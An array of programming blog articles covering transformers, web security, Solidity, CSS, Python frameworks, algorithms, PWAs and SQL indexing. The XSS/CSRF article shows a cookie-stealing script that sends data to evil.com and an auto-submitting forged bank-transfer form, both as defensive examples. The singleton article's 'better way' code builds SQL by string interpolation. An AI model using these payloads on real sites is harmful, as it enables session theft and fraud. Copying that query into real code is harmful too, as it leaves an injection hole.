  <li><strong>Key:</strong> What I have to offer (all other words).</li>
  <li><strong>Value:</strong> The actual content of the word.</li>
</ul>
<p>We multiply the Query and Key to get an "attention score" (how relevant they are to each other). We pass this through a Softmax function so it sums to 1. Then we multiply this by the Value.</p>
<h3>Implementing Scaled Dot-Product Attention (PyTorch)</h3>
<pre><code>import torch
import torch.nn.functional as F
import math

def scaled_dot_product_attention(query, key, value, mask=None):
    # D_k is the dimension of the keys
    d_k = query.size(-1)
    
    # 1. Multiply Q by K-transpose to get raw scores
    # Shape: (batch, seq_len, seq_len)
    scores = torch.matmul(query, key.transpose(-2, -1)) / math.sqrt(d_k)
    
    # 2. Apply masking (used in Decoders to prevent looking into the future)
    if mask is not None:
        scores = scores.masked_fill(mask == 0, -1e9)
    
    # 3. Apply softmax to get attention weights between 0 and 1
    p_attn = F.softmax(scores, dim=-1)
    
    # 4. Multiply weights by Values
    # Shape: (batch, seq_len, d_v)
    return torch.matmul(p_attn, value), p_attn</code></pre>
<p>This simple mathematical operation, repeated across multiple "heads" (Multi-Head Attention) and stacked in deep layers, is the engine that drives modern Generative AI. For a fantastic visual explanation, read Jay Alammar's <a href="https://jalammar.github.io/illustrated-transformer/">The Illustrated Transformer</a>.</p>
    `
  },
  {
    title: "Web Security 101: Understanding CSRF vs XSS",
    tags: ["web-security", "xss", "csrf", "infosec", "owasp"],
    content: `
<h2>Protecting Your Users</h2>
<p>Building functional web applications is only half the job. The other half is ensuring they are secure. The two most common and confused web vulnerabilities are <strong>XSS (Cross-Site Scripting)</strong> and <strong>CSRF (Cross-Site Request Forgery)</strong>. Let's break down how they work and how to completely prevent them.</p>
<hr>
<h3>1. Cross-Site Scripting (XSS)</h3>
<p>XSS occurs when an attacker injects malicious JavaScript into your website, which is then executed by the victim's browser. It allows the attacker to steal cookies, session tokens, or rewrite the HTML of the page.</p>
<h3>The Attack Scenario</h3>
<p>Imagine a blog comment section. An attacker submits the following comment:</p>
<pre><code>&lt;script&gt;
  fetch('https://evil.com/steal?cookie=' + document.cookie);
&lt;/script&gt;</code></pre>
<p>If your React or HTML templates do not sanitize this input, every single user who views that comment section will run that script, sending their session cookie to the hacker.</p>
<h3>How to Prevent XSS</h3>
<ul>
  <li><strong>Escape Everything:</strong> Never render raw HTML from users. Modern frameworks like React (JSX) and Angular do this automatically by converting <code>&lt;</code> to <code>&amp;lt;</code>.</li>
  <li><strong>Avoid dangerouslySetInnerHTML:</strong> If you must render markdown or rich text, use a rigorous sanitization library like <code>DOMPurify</code>.</li>
  <li><strong>Use HttpOnly Cookies:</strong> Set the <code>HttpOnly</code> flag on your session cookies. This prevents JavaScript (<code>document.cookie</code>) from reading them, entirely neutralizing cookie-theft XSS.</li>
</ul>
<blockquote>
  "XSS involves the attacker executing code on the victim's machine. CSRF involves tricking the victim into executing an action on a trusted site."
</blockquote>
<h3>2. Cross-Site Request Forgery (CSRF)</h3>
<p>CSRF takes advantage of the fact that browsers automatically attach cookies to requests sent to a specific domain, regardless of where the request originated.</p>
<h3>The Attack Scenario</h3>
<p>You are logged into your bank (<code>mybank.com</code>). In another tab, you visit <code>malicious-site.com</code>. The malicious site contains a hidden form:</p>
<pre><code>&lt;form action="https://mybank.com/transfer" method="POST" id="badForm"&gt;
  &lt;input type="hidden" name="toAccount" value="hacker123" /&gt;
  &lt;input type="hidden" name="amount" value="10000" /&gt;
&lt;/form&gt;
&lt;script&gt;
  document.getElementById('badForm').submit();
&lt;/script&gt;</code></pre>
<p>Because you are logged into <code>mybank.com</code>, the browser attaches your auth cookie to this POST request. The bank thinks YOU authorized the transfer.</p>
<h3>How to Prevent CSRF</h3>
<ul>
  <li><strong>SameSite Cookie Attribute:</strong> Set your cookies to <code>SameSite=Lax</code> or <code>SameSite=Strict</code>. This tells the browser <s>not to attach cookies to cross-site requests</s>, effectively killing CSRF.</li>
  <li><strong>Anti-CSRF Tokens:</strong> The server generates a unique, cryptographically strong token and embeds it in the HTML form. The server requires this token on submission. The malicious site cannot read this token due to the Same-Origin Policy.</li>
</ul>
<p>Familiarize yourself with the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> to keep your applications bulletproof.</p>
    `
  },
  {
    title: "Web3 Engineering: Writing Your First Solidity Smart Contract",
    tags: ["web3", "solidity", "smart-contracts", "ethereum", "blockchain-dev"],
    content: `
<h2>The Decentralized Backend</h2>
<p>In traditional web development, your backend logic runs on AWS or Heroku. In Web3, your backend logic (the Smart Contract) runs on a decentralized network of computers (the Blockchain, like Ethereum). Once deployed, the code is immutable—it cannot be changed. This requires a completely different engineering mindset.</p>
<hr>
<h3>What is Solidity?</h3>
<p>Solidity is an object-oriented, high-level language specifically designed for implementing smart contracts on the Ethereum Virtual Machine (EVM). It is statically typed and looks somewhat similar to JavaScript and C++.</p>
<h3>Building a Decentralized Vending Machine</h3>
<p>Let's write a simple contract that allows the owner to restock cupcakes, and allows anyone to purchase a cupcake by sending Ethereum.</p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VendingMachine {
    // State variables are permanently stored on the blockchain
    address public owner;
    mapping (address =&gt; uint) public cupcakeBalances;

    // Run once when the contract is deployed
    constructor() {
        owner = msg.sender; // The account that deployed the contract
        cupcakeBalances[address(this)] = 100; // Start with 100 cupcakes
    }

    // Modifier restricts who can call a function
    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this.");
        _;
    }

    // Allow the owner to restock
    function restock(uint amount) public onlyOwner {
        cupcakeBalances[address(this)] += amount;
    }

    // Allow anyone to purchase. "payable" means this function can receive ETH.
    function purchase(uint amount) public payable {
        // 1 ether is 10^18 wei
        require(msg.value &gt;= amount * 1 ether, "You must pay at least 1 ETH per cupcake");
        require(cupcakeBalances[address(this)] &gt;= amount, "Not enough cupcakes in stock to complete this purchase");
        
        // Update balances
        cupcakeBalances[address(this)] -= amount;
        cupcakeBalances[msg.sender] += amount;
    }
}</code></pre>
<h3>Key Web3 Concepts Used Here:</h3>
<ul>
  <li><strong>msg.sender:</strong> A global variable representing the Ethereum address of the person (or contract) calling the function.</li>
  <li><strong>msg.value:</strong> A global variable representing the amount of Wei (the smallest unit of Ether) sent with the transaction.</li>
  <li><strong>require():</strong> A statement that checks a condition. If it evaluates to false, the entire transaction is <em>reverted</em>, and any state changes are undone. Gas is still consumed.</li>
  <li><strong>mapping:</strong> Similar to a Hash Map or Dictionary. Here it maps Ethereum addresses to unsigned integers (balances).</li>
</ul>
<blockquote>
  "In Web3, security isn't a feature; it's the entire product. A single bug in a smart contract can result in millions of dollars being drained permanently."
</blockquote>
<p>To test this code right in your browser without installing anything, use the <a href="https://remix.ethereum.org/">Remix IDE</a>. Compile it, deploy it to a local test network, and interact with the functions!</p>
    `
  },
  {
    title: "Modern CSS Architectures: BEM vs Tailwind vs CSS-in-JS",
    tags: ["css-architecture", "bem", "tailwind-css", "css-in-js", "frontend-design"],
    content: `
<h2>The Evolution of Styling the Web</h2>
<p>Writing CSS is easy. Organizing CSS for a massive enterprise application is incredibly hard. Global scope, specificity wars, and dead code have plagued frontend developers for years. Over time, three major paradigms have emerged to solve these problems. Let's compare them.</p>
<hr>
<h3>1. The Methodology Approach: BEM</h3>
<p>BEM stands for <strong>Block, Element, Modifier</strong>. It is a strict naming convention that treats CSS classes like objects, ensuring styles are scoped by naming rules rather than relying on deep, fragile selectors.</p>
<pre><code>&lt;!-- Block: The independent entity --&gt;
&lt;div class="card"&gt;
  &lt;!-- Element: Tied to the block using double underscores --&gt;
  &lt;h2 class="card__title"&gt;Article Title&lt;/h2&gt;
  
  &lt;!-- Modifier: Changes appearance using double hyphens --&gt;
  &lt;button class="card__button card__button--primary"&gt;Read More&lt;/button&gt;
&lt;/div&gt;</code></pre>
<ul>
  <li><strong>Pros:</strong> Zero tooling required. Very readable. Solves specificity issues.</li>
  <li><strong>Cons:</strong> Class names become extremely long. Requires strict team discipline to maintain.</li>
</ul>
<h3>2. The Utility-First Approach: Tailwind CSS</h3>
<p>Instead of writing semantic classes (like <code>.btn</code>) and attaching CSS to them, you use hundreds of pre-defined, single-purpose utility classes directly in your HTML/JSX.</p>
<pre><code>&lt;div class="max-w-md rounded-xl shadow-lg bg-white p-6 border border-gray-200"&gt;
  &lt;h2 class="text-xl font-bold text-slate-800"&gt;Article Title&lt;/h2&gt;
  &lt;button class="mt-4 px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"&gt;
    Read More
  &lt;/button&gt;
&lt;/div&gt;</code></pre>
<ul>
  <li><strong>Pros:</strong> You never have to invent class names. Styles are entirely scoped to the element. The final CSS bundle is tiny (Tailwind purges unused classes).</li>
  <li><strong>Cons:</strong> The HTML gets very messy (class soup). Hard to read at a glance.</li>
</ul>
<h3>3. The Component Approach: CSS-in-JS</h3>
<p>Libraries like Styled-Components or Emotion allow you to write CSS directly inside your JavaScript components. The library generates unique, hashed class names at runtime, guaranteeing zero style collisions.</p>
<pre><code>import styled from 'styled-components';

const Card = styled.div\`
  background: white;
  padding: 1.5rem;
  border-radius: 8px;
\`;

const Title = styled.h2\`
  color: #333;
  font-size: 1.25rem;
\`;

// Usage
&lt;Card&gt;
  &lt;Title&gt;Article Title&lt;/Title&gt;
&lt;/Card&gt;</code></pre>
<ul>
  <li><strong>Pros:</strong> Perfect scoping. Allows you to pass JavaScript props directly into CSS (e.g., <code>color: \${props =&gt; props.theme.main}</code>).</li>
  <li><strong>Cons:</strong> Adds runtime performance overhead. Harder to use with modern Server-Side Rendering paradigms like Next.js App Router.</li>
</ul>
<blockquote>
  "The industry trend is heavily shifting towards Tailwind CSS, especially in the React ecosystem, due to its performance benefits and rapid development speed."
</blockquote>
    `
  },
  {
    title: "Python Backend Frameworks: FastAPI vs Django",
    tags: ["fastapi", "django", "python-backend", "asgi", "asyncio"],
    content: `
<h2>The Python Web Ecosystem in 2026</h2>
<p>For over a decade, Python developers faced a simple choice: use <strong>Django</strong> if you need a batteries-included monolithic framework, or use <strong>Flask</strong> if you want something minimal. But a relatively new contender, <strong>FastAPI</strong>, has completely disrupted the ecosystem with its incredible speed and modern architecture. Which one should you use?</p>
<hr>
<h3>The Heavyweight Champion: Django</h3>
<p>Django follows the "batteries-included" philosophy. It was built for Server-Side Rendering (SSR) but is widely used as an API backend via the Django Rest Framework (DRF).</p>
<ul>
  <li><strong>What you get out of the box:</strong> A robust ORM, a fantastic admin panel, user authentication, session management, and CSRF protection.</li>
  <li><strong>The Architecture:</strong> It traditionally uses WSGI (synchronous). It processes one request at a time per worker.</li>
  <li><strong>When to use:</strong> You are building a complex CRUD application, a content management system, or a secure enterprise SaaS and you want to move fast without reinventing the wheel.</li>
</ul>
<h3>The Modern Speedster: FastAPI</h3>
<p>FastAPI is built from the ground up to be asynchronous (ASGI). It heavily utilizes modern Python type hints to auto-validate data and auto-generate OpenAPI documentation.</p>
<pre><code>from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

# Pydantic validates the JSON payload automatically!
class Item(BaseModel):
    name: str
    price: float
    is_offer: bool = None

@app.post("/items/{item_id}")
async def create_item(item_id: int, item: Item):
    # Notice the "async def". This allows non-blocking I/O operations.
    return {"item_id": item_id, "item_name": item.name, "price": item.price}</code></pre>
<ul>
  <li><strong>What you get out of the box:</strong> Blazing fast performance (on par with Node.js and Go), automatic Swagger UI documentation, and automatic JSON validation via Pydantic.</li>
  <li><strong>The Architecture:</strong> ASGI. When your code makes a database call (using an async driver), FastAPI pauses that request and handles thousands of other requests concurrently until the database responds.</li>
  <li><strong>When to use:</strong> You are building a high-throughput microservice, a machine learning API, or a WebSocket-heavy application.</li>
</ul>
<blockquote>
  "FastAPI does not come with an ORM, auth system, or admin panel. You have to wire up SQLAlchemy and Alembic yourself. It is a micro-framework, not a macro-framework like Django."
</blockquote>
<p>If you want to learn FastAPI, the <a href="https://fastapi.tiangolo.com/">official documentation by Sebastián Ramírez</a> is widely considered some of the best documentation in the entire software engineering industry.</p>
    `
  },
  {
    title: "DSA Graph Patterns: Disjoint Set Union (Union-Find)",
    tags: ["union-find", "disjoint-set", "graph-theory", "kruskal-algorithm", "dsa-patterns"],
    content: `
<h2>Tracking Connected Components</h2>
<p>Imagine a social network where users can become friends. If User A is friends with User B, and User B is friends with User C, then A, B, and C all belong to the same "connected component." If User D suddenly asks, "Am I in the same friend network as User A?", how do we answer that quickly?</p>
<p>A standard Graph traversal (BFS/DFS) takes <code>O(V + E)</code> time. If we have millions of queries, this results in TLE. The <strong>Disjoint Set Union (DSU)</strong> data structure solves this in near <code>O(1)</code> time.</p>
<hr>
<h3>How DSU Works</h3>
<p>DSU maintains a collection of disjoint (non-overlapping) sets. It supports two primary operations:</p>
<ol>
  <li><strong>Find:</strong> Determine which set a particular element belongs to (by finding the "root" or "parent" of that set).</li>
  <li><strong>Union:</strong> Merge two sets into a single set.</li>
</ol>
<h3>The Two Optimizations</h3>
<p>A naive implementation can degenerate into a linked list, making operations <code>O(N)</code>. We apply two optimizations to achieve the almost constant <strong>Ackermann function</strong> time complexity.</p>
<ul>
  <li><strong>Path Compression:</strong> During a <code>Find</code> operation, make every visited node point directly to the root. This flattens the tree.</li>
  <li><strong>Union by Rank (or Size):</strong> During a <code>Union</code> operation, always attach the smaller tree to the root of the larger tree. This keeps the tree shallow.</li>
</ul>
<h3>C++ Implementation</h3>
<pre><code>#include &lt;vector&gt;
using namespace std;

class DSU {
private:
    vector&lt;int&gt; parent;
    vector&lt;int&gt; size;

public:
    DSU(int n) {
        parent.resize(n);
        size.resize(n, 1);
        for (int i = 0; i &lt; n; i++) {
            parent[i] = i; // Initially, every node is its own parent
        }
    }

    // Find with Path Compression
    int find(int i) {
        if (parent[i] == i) {
            return i;
        }
        // Recursively find root, and reassign parent (compression)
        return parent[i] = find(parent[i]);
    }

    // Union by Size
    void unite(int i, int j) {
        int rootI = find(i);
        int rootJ = find(j);

        if (rootI != rootJ) {
            // Attach the smaller tree under the larger tree
            if (size[rootI] &lt; size[rootJ]) {
                swap(rootI, rootJ);
            }
            parent[rootJ] = rootI;
            size[rootI] += size[rootJ];
        }
    }
    
    bool connected(int i, int j) {
        return find(i) == find(j);
    }
};</code></pre>
<blockquote>
  "DSU is the backbone of Kruskal's Algorithm for finding the Minimum Spanning Tree of a graph."
</blockquote>
<p>Mastering DSU is essential for graph problems. Try solving "Number of Provinces", "Redundant Connection", or "Accounts Merge" on LeetCode using this exact boilerplate!</p>
    `
  },
  {
    title: "Real-Time Web: Server-Sent Events (SSE) vs WebSockets",
    tags: ["websockets", "sse", "real-time", "browser-apis", "web-protocols"],
    content: `
<h2>Choosing the Right Real-Time Protocol</h2>
<p>When developers need real-time data in the browser, they immediately reach for WebSockets. But did you know there is a lighter, natively supported alternative built specifically for one-way data? Let's compare <strong>WebSockets</strong> and <strong>Server-Sent Events (SSE)</strong>.</p>
<hr>
<h3>The Overkill of WebSockets</h3>
<p>WebSockets provide a full-duplex, bidirectional communication channel over a single TCP connection. They are brilliant for chat applications and multiplayer games.</p>
<p>However, if you are building a stock ticker, a live sports scoreboard, or a notification dropdown, <s>WebSockets are entirely unnecessary</s>. You only need the server to push data to the client, not the other way around.</p>
<h3>Enter Server-Sent Events (SSE)</h3>
<p>SSE is a unidirectional protocol. The client opens a standard HTTP connection, and the server keeps it open, pushing text-based events whenever new data arrives.</p>
<ul>
  <li><strong>Native Browser Support:</strong> SSE uses the built-in <code>EventSource</code> API. No massive client libraries like Socket.io are needed.</li>
  <li><strong>Auto-Reconnection:</strong> If the connection drops, SSE automatically tries to reconnect. WebSockets require you to write your own reconnection logic.</li>
  <li><strong>Standard HTTP:</strong> SSE works perfectly over standard HTTP/2 and easily passes through corporate firewalls and load balancers.</li>
</ul>
<h3>Implementing SSE in Node.js</h3>
<p>Here is how simple it is to create an SSE endpoint in Express:</p>
<pre><code>app.get('/api/stream', (req, res) =&gt; {
  // Set headers to keep the connection open
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  // Send initial data
  res.write('data: {"message": "Connected to stream"}\\n\\n');

  // Push new data every 2 seconds
  const interval = setInterval(() =&gt; {
    const data = JSON.stringify({ time: new Date().toISOString() });
    res.write(\`data: \${data}\\n\\n\`);
  }, 2000);

  // Clean up when client disconnects
  req.on('close', () =&gt; {
    clearInterval(interval);
  });
});</code></pre>
<h3>The Client-Side Code</h3>
<pre><code>const source = new EventSource('/api/stream');

source.onmessage = function(event) {
  const data = JSON.parse(event.data);
  console.log("New update:", data.time);
};</code></pre>
<blockquote>
  "Use WebSockets when the client needs to talk back frequently. Use SSE when the server is the only one broadcasting."
</blockquote>
<p>For a deeper dive into the specification, read the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events">MDN Guide on Server-Sent Events</a>.</p>
    `
  },
  {
    title: "Design Patterns: The Singleton Anti-Pattern in JavaScript",
    tags: ["singleton", "anti-patterns", "clean-code", "solid-principles", "refactoring"],
    content: `
<h2>The Most Abused Design Pattern</h2>
<p>The <strong>Singleton Pattern</strong> ensures that a class has only one instance and provides a global point of access to it. While it sounds incredibly useful for things like database connections or configuration managers, it is widely considered an <em>anti-pattern</em> in modern software engineering.</p>
<hr>
<h3>Why Singletons Are Dangerous</h3>
<ol>
  <li><strong>Hidden Dependencies:</strong> Components that use Singletons hide their dependencies. You don't know what a class relies on just by looking at its constructor.</li>
  <li><strong>Testing Nightmare:</strong> Because Singletons carry global state, test cases can pollute each other. If Test A modifies the Singleton, Test B might fail unpredictably.</li>
  <li><strong>Violation of Single Responsibility:</strong> A Singleton controls its own creation and lifecycle, in addition to its actual business logic.</li>
</ol>
<h3>The Classic JS Singleton (What NOT to do)</h3>
<pre><code>class Database {
  constructor() {
    if (Database.instance) {
      return Database.instance;
    }
    this.connection = "Connected";
    Database.instance = this;
  }

  query(sql) {
    console.log(\`Executing: \${sql}\`);
  }
}

const db1 = new Database();
const db2 = new Database();
console.log(db1 === db2); // true</code></pre>
<h3>The Better Way: Dependency Injection</h3>
<p>Instead of forcing a class to be a Singleton, create a single instance of the class at the entry point of your application and <em>pass it down</em> (inject it) to the components that need it.</p>
<pre><code>class Database {
  query(sql) { /* ... */ }
}

class UserRepository {
  // The dependency is explicitly declared!
  constructor(database) {
    this.db = database;
  }

  getUser(id) {
    return this.db.query(\`SELECT * FROM users WHERE id = \${id}\`);
  }
}

// Composition Root (index.js)
const myDb = new Database(); // Created once
const userRepo = new UserRepository(myDb); // Injected</code></pre>
<blockquote>
  "Global state is the enemy of maintainable code. Singletons are just global variables in object-oriented clothing."
</blockquote>
<p>If you are using Node.js, remember that Node's module system caches <code>require()</code> calls. If you export a class instance from a file, it acts as a Singleton automatically across your app, which is a safer, module-scoped approach.</p>
    `
  },
  {
    title: "Machine Learning Math: Principal Component Analysis (PCA)",
    tags: ["pca", "data-science", "linear-algebra", "dimensionality-reduction", "scikit-learn"],
    content: `
<h2>Escaping the Curse of Dimensionality</h2>
<p>In Machine Learning, having too many features (dimensions) can ruin your model's performance. This is known as the <em>Curse of Dimensionality</em>. <strong>Principal Component Analysis (PCA)</strong> is a beautiful linear algebra technique used to reduce the number of features while retaining as much variance (information) as possible.</p>
<hr>
<h3>The Intuition Behind PCA</h3>
<p>Imagine you have a 3D dataset of points shaped like a flat pancake. Even though it's in 3D space, almost all the interesting variation happens along 2 dimensions. PCA finds these lines of maximum variance, called <strong>Principal Components</strong>.</p>
<ol>
  <li>First, we mean-center the data.</li>
  <li>We compute the Covariance Matrix of the features.</li>
  <li>We calculate the <strong>Eigenvectors</strong> and <strong>Eigenvalues</strong> of that matrix.</li>
  <li>We sort the Eigenvectors by their Eigenvalues (which represent the magnitude of variance).</li>
  <li>We project the original data onto the top <em>K</em> Eigenvectors to create a lower-dimensional dataset.</li>
</ol>
<h3>Implementing PCA from Scratch in Python</h3>
<p>While you should use <code>sklearn</code> in production, writing it from scratch using NumPy builds true understanding.</p>
<pre><code>import numpy as np

def perform_pca(X, num_components):
    # 1. Standardize the data (Mean centering)
    X_meaned = X - np.mean(X, axis=0)
    
    # 2. Calculate the Covariance Matrix
    # rowvar=False means each column is a variable
    cov_mat = np.cov(X_meaned, rowvar=False)
    
    # 3. Calculate Eigenvalues and Eigenvectors
    eigen_values, eigen_vectors = np.linalg.eigh(cov_mat)
    
    # 4. Sort the vectors in descending order of values
    sorted_index = np.argsort(eigen_values)[::-1]
    sorted_eigenvectors = eigen_vectors[:, sorted_index]
    
    # 5. Select the top N components
    eigenvector_subset = sorted_eigenvectors[:, 0:num_components]
    
    # 6. Transform the data
    X_reduced = np.dot(eigenvector_subset.transpose(), X_meaned.transpose()).transpose()
    
    return X_reduced

# Usage on dummy data (100 samples, 5 features)
data = np.random.rand(100, 5)
reduced_data = perform_pca(data, 2) # Reduced to 2D!</code></pre>
<blockquote>
  "PCA is not just for machine learning. It is an incredibly powerful data visualization tool, allowing you to plot 50-dimensional datasets on a simple 2D scatter plot."
</blockquote>
<p>To learn more about the linear algebra behind this, I highly recommend reading <a href="https://mml-book.github.io/">Mathematics for Machine Learning</a>.</p>
    `
  },
  {
    title: "Advanced Algorithms: The Aho-Corasick Automaton",
    tags: ["aho-corasick", "pattern-matching", "advanced-algorithms", "text-processing", "strings"],
    content: `
<h2>Searching for Multiple Patterns Simultaneously</h2>
<p>If you need to find a single word in a massive text, the Knuth-Morris-Pratt (KMP) algorithm is your best friend. But what if you have a dictionary of 10,000 bad words, and you need to filter a chat message? Running KMP 10,000 times is terribly inefficient. You need the <strong>Aho-Corasick Algorithm</strong>.</p>
<hr>
<h3>How Aho-Corasick Works</h3>
<p>Aho-Corasick combines a <strong>Trie</strong> with a <strong>Finite State Automaton</strong>. It processes the text in exactly <code>O(N + M + Z)</code> time, where <code>N</code> is the text length, <code>M</code> is the total length of all dictionary words, and <code>Z</code> is the number of matches found.</p>
<ul>
  <li><strong>The Trie:</strong> First, we build a standard Trie containing all our target patterns.</li>
  <li><strong>Failure Links:</strong> This is the magic. We run a BFS over the Trie. If we are matching a word and suddenly encounter a mismatch, where should we go next? A <em>Failure Link</em> points to the longest possible proper suffix that is also a valid prefix in our Trie.</li>
  <li><strong>Output Links:</strong> Sometimes, a smaller word is completely contained within a larger word. Output links ensure we don't miss these subsets.</li>
</ul>
<h3>The Core Logic (Pseudocode)</h3>
<pre><code>function buildFailureLinks(root):
    queue = new Queue()
    // Initialize failure links for depth 1 to root
    for each child of root:
        child.fail = root
        queue.push(child)
        
    while queue is not empty:
        current = queue.pop()
        
        for each character c, child in current.children:
            queue.push(child)
            fallback = current.fail
            
            // Traverse failure links until we find a match or hit root
            while fallback != root and fallback has no child c:
                fallback = fallback.fail
                
            if fallback has child c:
                child.fail = fallback.child(c)
            else:
                child.fail = root
                
            // Merge output matches
            child.outputs += child.fail.outputs</code></pre>
<blockquote>
  "Aho-Corasick is the algorithm that powers the 'fgrep' utility in Unix systems and network intrusion detection systems like Snort."
</blockquote>
<p>This is a notoriously difficult algorithm to implement correctly from scratch during a contest. If you are preparing for competitive programming, memorize the state-machine transitions carefully. Read the thorough explanation on <a href="https://cp-algorithms.com/string/aho_corasick.html">CP-Algorithms</a>.</p>
    `
  },
  {
    title: "App Development in 2026: React Native vs Native (Swift/Kotlin)",
    tags: ["react-native", "ios-dev", "android-dev", "cross-platform", "swift"],
    content: `
<h2>The Endless Cross-Platform Debate</h2>
<p>Should a startup build their app natively using Swift (iOS) and Kotlin (Android), or use a cross-platform framework like <strong>React Native</strong>? With the recent architectural changes to React Native, the answer has shifted significantly.</p>
<hr>
<h3>The Old React Native (The Bridge)</h3>
<p>Historically, React Native suffered from a performance bottleneck called <em>The Bridge</em>. Your JavaScript code had to serialize data into JSON, send it across the asynchronous bridge to the Native side, deserialize it, and then execute it. This caused jank during heavy animations or massive list scrolls.</p>
<h3>The New React Native (JSI & Fabric)</h3>
<p>React Native has undergone a massive rewrite. The bridge is dead.</p>
<ul>
  <li><strong>JSI (JavaScript Interface):</strong> JS can now hold direct references to C++ objects. No more JSON serialization. JS can call native methods synchronously.</li>
  <li><strong>Fabric:</strong> The new rendering system. It allows React to directly mutate native UI elements, perfectly syncing with the device's refresh rate.</li>
</ul>
<blockquote>
  "With the new architecture, React Native is virtually indistinguishable from purely native apps for 95% of use cases."
</blockquote>
<h3>When to Choose Native (Swift / Kotlin)</h3>
<p>Despite these massive improvements, you should still choose purely native development if your app falls into these categories:</p>
<ol>
  <li><strong>Heavy Hardware Integration:</strong> Apps that rely heavily on Bluetooth LE, complex Camera APIs, or ARKit/ARCore.</li>
  <li><strong>Graphics Intensive:</strong> High-end mobile games or 3D rendering engines (you should probably use Unity or Unreal anyway).</li>
  <li><strong>Platform-Specific UI:</strong> If you want your app to feel 100% like a perfectly tailored iOS app with native typography and gesture physics, SwiftUI is still superior.</li>
</ol>
<h3>Writing a Native Module</h3>
<p>Even in React Native, you often need to write Native code. Here is what exposing an iOS Swift function to React Native looks like:</p>
<pre><code>// MathModule.swift
@objc(MathModule)
class MathModule: NSObject {
  
  @objc(add:withB:withResolver:withRejecter:)
  func add(a: Float, b: Float, resolve:RCTPromiseResolveBlock,reject:RCTPromiseRejectBlock) -&gt; Void {
    resolve(a + b)
  }
}</code></pre>
<p>If you are a web developer looking to enter mobile, React Native is hands-down the best starting point. For official setup guides, visit the <a href="https://reactnative.dev/docs/getting-started">React Native documentation</a>.</p>
    `
  },
  {
    title: "Web Performance: Service Workers and Offline-First PWAs",
    tags: ["pwa", "service-workers", "offline-first", "caching-strategies", "web-workers"],
    content: `
<h2>Making the Web Resilient</h2>
<p>A Progressive Web App (PWA) is a website that looks and feels like a native app. It can be installed on a user's home screen and, most importantly, it works <strong>offline</strong>. The engine behind this magic is the <strong>Service Worker</strong>.</p>
<hr>
<h3>What is a Service Worker?</h3>
<p>A Service Worker is a type of Web Worker. It is a JavaScript file that runs entirely in the background, separate from your web page. It acts as a programmable network proxy, allowing you to intercept network requests and serve cached responses.</p>
<h3>The Service Worker Lifecycle</h3>
<ol>
  <li><strong>Registration:</strong> The browser downloads the worker.</li>
  <li><strong>Installation:</strong> This is where you pre-cache static assets (HTML, CSS, JS, Logos).</li>
  <li><strong>Activation:</strong> This is where you clean up old caches if your app version has changed.</li>
  <li><strong>Fetch:</strong> The worker listens to all network requests from your app.</li>
</ol>
<h3>Implementing a Cache-First Strategy</h3>
<p>A "Cache-First" strategy means: <em>"Check the cache for the file. If it exists, return it instantly. If not, go to the network, return the file, and save it in the cache for next time."</em></p>
<pre><code>const CACHE_NAME = 'my-pwa-cache-v1';

// 1. Install event: Pre-cache core assets
self.addEventListener('install', event =&gt; {
  event.waitUntil(
    caches.open(CACHE_NAME).then(cache =&gt; {
      return cache.addAll([
        '/',
        '/index.html',
        '/styles.css',
        '/app.js'
      ]);
    })
  );
});

// 2. Fetch event: Intercept requests
self.addEventListener('fetch', event =&gt; {
  event.respondWith(
    caches.match(event.request).then(cachedResponse =&gt; {
      // Return cached version if found
      if (cachedResponse) {
        return cachedResponse;
      }
      
      // Otherwise, fetch from network and cache it dynamically
      return fetch(event.request).then(networkResponse =&gt; {
        return caches.open(CACHE_NAME).then(cache =&gt; {
          cache.put(event.request, networkResponse.clone());
          return networkResponse;
        });
      });
    })
  );
});</code></pre>
<blockquote>
  "Offline-first isn't just about when the user has no internet. It's about 'Lie-Fi'—when the phone says it has 4G, but nothing is loading. Service workers make your app instantly interactive regardless of network conditions."
</blockquote>
<p>Writing service workers from scratch is error-prone. In production, you should strongly consider using Google's <a href="https://developer.chrome.com/docs/workbox/">Workbox</a> library to manage complex caching strategies like <em>Stale-While-Revalidate</em>.</p>
    `
  },
  {
    title: "SQL Internals: B-Tree Indexing and Query Optimization",
    tags: ["sql", "databases", "rdbms", "indexing", "query-optimization"],
    content: `
<h2>Why is My Query So Slow?</h2>
<p>You have a PostgreSQL table with 50 million rows. You run <code>SELECT * FROM users WHERE email = 'test@test.com'</code> and it takes 4 seconds. You add an index, and suddenly it takes 2 milliseconds. What kind of dark magic is happening inside the database engine?</p>
<hr>
<h3>The Table Scan (O(N))</h3>
<p>By default, a database stores rows in a structure called a Heap. When you search for an email without an index, the database performs a <strong>Full Table Scan</strong>. It reads every single row on disk to check if the email matches. Disk I/O is incredibly slow.</p>
<h3>The B-Tree Index (O(log N))</h3>
<p>When you create an index (<code>CREATE INDEX idx_email ON users(email);</code>), the database creates a separate data structure: a <strong>B-Tree (Balanced Tree)</strong>.</p>
<ul>
  <li>The <strong>root</strong> and <strong>internal nodes</strong> contain range values (e.g., "A - M" and "N - Z") acting as signposts.</li>
  <li>The <strong>leaf nodes</strong> contain the actual indexed values (the emails) sorted alphabetically, along with a pointer (a Row ID) back to the exact physical location of the full row in the Heap.</li>
</ul>
<blockquote>
  "A B-Tree is shallow and wide. Even for a billion records, the tree might only be 4 levels deep. This means the database only needs to perform 4 disk reads to find any record."
</blockquote>
<h3>Clustered vs Non-Clustered Indexes</h3>
<p>It's vital to understand the difference between these two:</p>
<ol>
  <li><strong>Clustered Index:</strong> This determines the physical order of the data on disk. A table can only have <em>one</em> clustered index (usually the Primary Key). The leaf nodes of a clustered index contain the actual row data, not just pointers.</li>
  <li><strong>Non-Clustered Index:</strong> (Like our email index). The physical data is not ordered by email. The leaf nodes contain pointers back to the clustered index.</li>
</ol>
<h3>Understanding EXPLAIN ANALYZE</h3>
<p>To optimize queries, you must read query execution plans.</p>
<pre><code>EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'test@test.com';

-- Bad output:
-- Seq Scan on users (cost=0.00..1523.45 rows=1 width=104) (actual time=0.012..4000.123)

-- Good output:
-- Index Scan using idx_email on users (cost=0.29..8.30 rows=1 width=104) (actual time=0.015..0.016)</code></pre>
